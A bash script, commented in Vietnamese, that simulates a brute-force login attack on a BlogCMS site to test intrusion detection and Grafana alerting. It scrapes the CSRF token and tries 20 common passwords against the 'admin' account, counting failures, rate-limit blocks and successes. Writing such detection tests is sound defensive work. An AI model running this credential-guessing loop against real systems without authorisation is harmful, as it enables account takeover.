#!/usr/bin/env bash
# =============================================================================
# Kịch bản mô phỏng tấn công dò mật khẩu (Brute Force) vào BlogCMS
# Mục đích: Kiểm thử hệ thống phát hiện xâm nhập và cảnh báo Grafana Alerting
# =============================================================================
set -e

TARGET_HOST="${1:-https://localhost}"
LOGIN_URL="${TARGET_HOST}/login"
COOKIE_JAR="/tmp/bruteforce_cookie_$$.txt"

echo "================================================================================"
echo "[*] BẮT ĐẦU MÔ PHỎNG TẤN CÔNG BRUTE FORCE VÀO TRANG ĐĂNG NHẬP"
echo "    Mục tiêu: ${LOGIN_URL}"
echo "    Tài khoản nhắm tới: admin"
echo "    Số lần thử: 20 lần (giãn cách ~0.5 giây)"
echo "    Thời gian bắt đầu: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================================"

# Danh sách mật khẩu mẫu trong từ điển tấn công brute force
PASSWORDS=(
  "admin123"
  "password"
  "12345678"
  "admin@2026"
  "qwerty123"
  "letmeinnow"
  "rootadmin"
  "supersecret"
  "blogcms2026"
  "masterkey"
  "admin8888"
  "welcome1"
  "administrator"
  "dragon123"
  "iloveyou"
  "pass123456"
  "admin_root"
  "toor2026"
  "hacker123"
  "finalguess"
)

SUCCESS_COUNT=0
FAIL_COUNT=0
RATE_LIMITED_COUNT=0

for i in $(seq 1 20); do
  PASS="${PASSWORDS[$((i-1))]}"
  NOW=$(date '+%H:%M:%S')

  # 1. Lấy trang đăng nhập, lấy session cookie và CSRF token
  LOGIN_HTML=$(curl -sk -c "${COOKIE_JAR}" "${LOGIN_URL}")
  CSRF_TOKEN=$(echo "${LOGIN_HTML}" | grep -o 'name="_csrf" value="[^"]*"' | head -n1 | cut -d'"' -f4)

  if [ -z "${CSRF_TOKEN}" ]; then
    # Thử tìm CSRF token theo regex linh hoạt hơn
    CSRF_TOKEN=$(echo "${LOGIN_HTML}" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -n1)
  fi

  # 2. Gửi yêu cầu đăng nhập sai
  HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" \
    -X POST "${LOGIN_URL}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "_csrf=${CSRF_TOKEN}" \
    --data-urlencode "username=admin" \
    --data-urlencode "password=${PASS}")

  echo "[${NOW}] Lần ${i}/20 | User: admin | Pass: ${PASS} | HTTP Status: ${HTTP_CODE}"

  if [ "${HTTP_CODE}" -eq 401 ] || [ "${HTTP_CODE}" -eq 400 ]; then
    FAIL_COUNT=$((FAIL_COUNT + 1))
  elif [ "${HTTP_CODE}" -eq 429 ]; then
    RATE_LIMITED_COUNT=$((RATE_LIMITED_COUNT + 1))
  elif [ "${HTTP_CODE}" -eq 302 ] || [ "${HTTP_CODE}" -eq 200 ]; then
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  fi

  sleep 0.5
done

rm -f "${COOKIE_JAR}"

echo "================================================================================"
echo "[+] HOÀN THÀNH ĐỢT KIỂM THỬ MÔ PHỎNG TẤN CÔNG BRUTE FORCE"
echo "    Tổng số yêu cầu: 20"
echo "    Đăng nhập thất bại (400/401): ${FAIL_COUNT}"
echo "    Bị chặn bởi Rate Limit (429): ${RATE_LIMITED_COUNT}"
echo "    Đăng nhập thành công: ${SUCCESS_COUNT}"
echo "    Thời gian kết thúc: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================================"
